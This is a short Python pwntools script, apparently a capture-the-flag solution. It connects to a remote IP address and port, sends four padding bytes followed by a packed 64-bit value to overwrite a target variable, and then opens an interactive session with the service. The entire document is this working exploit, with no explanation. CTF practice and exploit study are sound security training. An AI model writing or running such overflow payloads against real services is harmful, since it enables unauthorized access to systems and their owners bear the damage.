from pwn import *

p = remote('220.249.52.133',53120)
payload="a"*4+p64(1853186401)


p.sendline(payload)
p.interactive()
